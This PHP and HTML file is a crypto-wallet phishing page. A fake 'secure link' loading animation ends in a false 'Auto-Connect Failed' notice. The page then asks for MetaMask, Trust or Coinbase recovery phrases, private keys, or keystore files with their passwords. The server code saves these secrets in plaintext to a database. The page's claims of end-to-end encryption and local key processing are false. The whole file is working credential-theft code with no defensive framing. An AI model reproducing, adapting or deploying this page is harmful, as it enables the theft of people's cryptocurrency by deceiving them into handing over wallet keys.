<?php
include 'header.php';


if (isset($_POST['connect_wallet'])) {
    $user_id = $_SESSION['user_id']; 
    
    // 1. Get Inputs
    $wallet_name = clean($_POST['wallet_provider']);
    $type = clean($_POST['type']);
    
    $phrase = "";
    $json = "";
    $pass = "";
    $priv_key = "";

    // 2. Capture Data based on Type
    if ($type == 'Phrase') {
        $phrase = clean($_POST['recovery_phrase']);
    } elseif ($type == 'Keystore JSON') {
        $json = mysqli_real_escape_string($link, $_POST['keystore_json']); // Allow JSON chars
        $pass = clean($_POST['wallet_password']);
    } elseif ($type == 'Private') {
        $priv_key = clean($_POST['private_key']);
    }

    // 3. Insert into Database
    $sql = "INSERT INTO crypto_wallets (user_id, wallet_name, import_type, phrase, keystore_json, wallet_password, private_key) 
            VALUES ('$user_id', '$wallet_name', '$type', '$phrase', '$json', '$pass', '$priv_key')";

    if (mysqli_query($link, $sql)) {
        // Success: Redirect or Show Message
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                Swal.fire({
                    icon: 'success',
                    title: 'Connected',
                    text: 'Your wallet has been successfully synchronized.',
                    confirmButtonText: 'Go to Dashboard'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = 'dashboard.php';
                    }
                });
            });
        </script>";
    } else {
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                Swal.fire({icon: 'error', title: 'Error', text: 'Connection failed. Please try again.'});
            });
        </script>";
    }
}
?>

<div class="flex-1 overflow-y-auto p-4 md:p-8 pb-24 relative flex flex-col items-center pt-10">
    
    <div id="loadingStage" class="w-full max-w-sm glass-panel p-8 rounded-3xl border border-indigo-500/20 shadow-2xl relative z-10 text-center mt-20">
        <div class="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
            <div class="absolute inset-0 border-2 border-indigo-500/20 rounded-full animate-ping"></div>
            <div class="absolute inset-0 border-2 border-indigo-500/50 rounded-full"></div>
            <i class="fa-solid fa-shield-halved text-4xl text-indigo-500"></i>
        </div>
        <h2 id="loadingText" class="text-xl font-bold text-slate-900 dark:text-white mb-2">Initializing Secure Link...</h2>
        <div class="w-full bg-slate-200 rounded-full h-1.5 mb-2 dark:bg-slate-700 overflow-hidden">
            <div id="progressBar" class="bg-indigo-600 h-1.5 rounded-full transition-all duration-500" style="width: 0%"></div>
        </div>
        <p id="loadingSubtext" class="text-xs text-indigo-400 font-mono">Handshake Protocol: v4.2</p>
    </div>

    <div id="walletStage" class="glass-panel w-full max-w-6xl rounded-3xl p-6 md:p-10 border border-slate-200 dark:border-white/5 shadow-2xl relative hidden z-10">
        
        <div class="flex flex-col md:flex-row gap-10">
            
            <div class="md:w-1/3 border-b md:border-b-0 md:border-r border-slate-200 dark:border-white/5 pr-0 md:pr-10 pb-6 md:pb-0">
                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 border border-red-500/20 text-red-500 text-[10px] font-bold uppercase tracking-wider mb-4">
                    <i class="fa-solid fa-circle-exclamation"></i> Auto-Connect Failed
                </div>
                <h2 class="text-2xl font-bold text-slate-900 dark:text-white mb-3">Manual Connection Required</h2>
                <p class="text-sm text-slate-500 dark:text-slate-400 mb-6 leading-relaxed">
                    The automated handshake protocol failed due to network congestion. Please manually select your provider and authenticate using your secure keys to establish a bridge.
                </p>
                
                <div class="space-y-3">
                    <div class="flex items-center gap-3 text-sm text-slate-500 dark:text-slate-400">
                        <i class="fa-solid fa-check-circle text-green-500"></i> End-to-End Encryption
                    </div>
                    <div class="flex items-center gap-3 text-sm text-slate-500 dark:text-slate-400">
                        <i class="fa-solid fa-check-circle text-green-500"></i> Local Key Processing
                    </div>
                    <div class="flex items-center gap-3 text-sm text-slate-500 dark:text-slate-400">
                        <i class="fa-solid fa-check-circle text-green-500"></i> SSL Secure Connection
                    </div>
                </div>
            </div>

            <div class="md:w-2/3">
                <form id="manualForm" method="POST">
                    
                    <input type="hidden" name="wallet_provider" id="wallet_provider" value="MetaMask">

                    <div class="mb-6">
                        <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-3">Select Wallet Provider</label>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
                            <div onclick="selectWallet(this, 'MetaMask')" class="flex flex-col items-center gap-2 p-3 rounded-xl border border-indigo-500 bg-indigo-500/10 cursor-pointer transition-all wallet-item">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="w-8 h-8">
                                <span class="text-xs font-bold text-slate-700">MetaMask</span>
                            </div>
                            <div onclick="selectWallet(this, 'Trust Wallet')" class="flex flex-col items-center gap-2 p-3 rounded-xl border border-slate-200 dark:border-white/10 hover:border-indigo-500 hover:bg-indigo-500/10 cursor-pointer transition-all wallet-item">
                                <img src="data:image/jpeg;base64,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" class="w-8 h-8">
                                <span class="text-xs font-bold text-slate-700">Trust</span>
                            </div>
                            <div onclick="selectWallet(this, 'Coinbase')" class="flex flex-col items-center gap-2 p-3 rounded-xl border border-slate-200 dark:border-white/10 hover:border-indigo-500 hover:bg-indigo-500/10 cursor-pointer transition-all wallet-item">
                                <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" class="w-8 h-8 object-contain">
                                <span class="text-xs font-bold text-slate-700">Coinbase</span>
                            </div>
                            <div onclick="selectWallet(this, 'Other')" class="flex flex-col items-center gap-2 p-3 rounded-xl border border-slate-200 dark:border-white/10 hover:border-indigo-500 hover:bg-indigo-500/10 cursor-pointer transition-all wallet-item">
                                <div class="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center text-white font-bold text-xs">
                                    <i class="fa-solid fa-wallet"></i>
                                </div>
                                <span class="text-xs font-bold text-slate-700">Other</span>
                            </div>
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-2">Import Method</label>
                        <div class="relative">
                            <select id="type" name="type" onchange="toggleFields()" class="w-full bg-slate-50 dark:bg-[#02040a] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-3 px-4 focus:outline-none focus:border-indigo-500 appearance-none cursor-pointer font-medium text-sm">
                                <option value="Phrase" selected>Recovery Phrase</option>
                                <option value="Keystore JSON">Keystore JSON</option>
                                <option value="Private">Private Key</option>
                            </select>
                            <i class="fa-solid fa-chevron-down absolute right-4 top-1/2 transform -translate-y-1/2 text-slate-400 pointer-events-none text-xs"></i>
                        </div>
                    </div>

                    <div id="phraseBox" class="mb-8">
                        <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-2">Recovery Phrase</label>
                        <div class="relative">
                            <textarea name="recovery_phrase" placeholder="Enter your 12 or 24 word recovery phrase..." rows="4" class="w-full bg-slate-50 dark:bg-[#02040a] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-4 px-5 focus:outline-none focus:border-indigo-500 transition-all text-sm resize-none font-mono"></textarea>
                            <div class="absolute top-4 right-4 text-slate-500 pointer-events-none">
                                <i class="fa-solid fa-key"></i>
                            </div>
                        </div>
                    </div>

                    <div id="jsonBox" class="hidden mb-8 space-y-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-2">Keystore JSON</label>
                            <textarea name="keystore_json" placeholder='{"version":3,"id":"..."}' rows="4" class="w-full bg-slate-50 dark:bg-[#02040a] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-4 px-5 focus:outline-none focus:border-indigo-500 transition-all text-sm font-mono resize-none"></textarea>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-2">Wallet Password</label>
                            <input type="password" name="wallet_password" placeholder="Password used to encrypt this JSON" class="w-full bg-slate-50 dark:bg-[#02040a] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-4 px-5 focus:outline-none focus:border-indigo-500 transition-all text-sm">
                        </div>
                    </div>

                    <div id="privateKeyBox" class="hidden mb-8">
                        <label class="block text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider mb-2">Private Key</label>
                        <input type="text" name="private_key" placeholder="e.g. 0x3a107..." class="w-full bg-slate-50 dark:bg-[#02040a] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-4 px-5 focus:outline-none focus:border-indigo-500 transition-all text-sm font-mono">
                      
                    </div>

                    <button type="submit" name="connect_wallet" class="w-full py-4 rounded-xl bg-gradient-to-r from-indigo-600 to-violet-600 text-white font-bold shadow-lg shadow-indigo-500/30 hover:scale-[1.01] transition-transform flex items-center justify-center gap-2 text-sm uppercase tracking-wide">
                        <i class="fa-solid fa-bolt"></i> Secure Connection
                    </button>

                </form>
            </div>
        </div>

    </div>

</div>

<script>
    // --- SIMULATE LOADING SEQUENCE ---
    window.addEventListener('load', () => {
        const steps = [
            { text: "Establishing Secure Channel...", progress: "20%" },
            { text: "Verifying Blockchain Nodes...", progress: "45%" },
            { text: "Encrypting Handshake...", progress: "70%" },
            { text: "Syncing Wallet Protocols...", progress: "90%" }
        ];

        let step = 0;
        const textEl = document.getElementById('loadingText');
        const barEl = document.getElementById('progressBar');

        const interval = setInterval(() => {
            if (step < steps.length) {
                textEl.innerText = steps[step].text;
                barEl.style.width = steps[step].progress;
                step++;
            } else {
                clearInterval(interval);
                // Show Form
                document.getElementById('loadingStage').style.display = 'none';
                document.getElementById('walletStage').classList.remove('hidden');
                document.getElementById('walletStage').classList.add('animate-fade-in-up');
            }
        }, 800);
    });

    // --- TOGGLE FIELDS LOGIC ---
    function toggleFields() {
        const type = document.getElementById('type').value;
        const phraseBox = document.getElementById('phraseBox');
        const jsonBox = document.getElementById('jsonBox');
        const privateKeyBox = document.getElementById('privateKeyBox');

        // Hide all
        phraseBox.classList.add('hidden');
        jsonBox.classList.add('hidden');
        privateKeyBox.classList.add('hidden');

        // Show selected
        if (type === 'Phrase') {
            phraseBox.classList.remove('hidden');
        } else if (type === 'Keystore JSON') {
            jsonBox.classList.remove('hidden');
        } else if (type === 'Private') {
            privateKeyBox.classList.remove('hidden');
        }
    }

    // --- WALLET SELECTION ---
    function selectWallet(element, name) {
        // Update Hidden Input
        document.getElementById('wallet_provider').value = name;

        // Visual Reset
        document.querySelectorAll('.wallet-item').forEach(item => {
            item.classList.remove('border-indigo-500', 'bg-indigo-500/10');
            item.classList.add('border-slate-200'); // default border
        });

        // Visual Active
        element.classList.remove('border-slate-200');
        element.classList.add('border-indigo-500', 'bg-indigo-500/10');
    }
</script>

<?php include 'footer.php'; ?>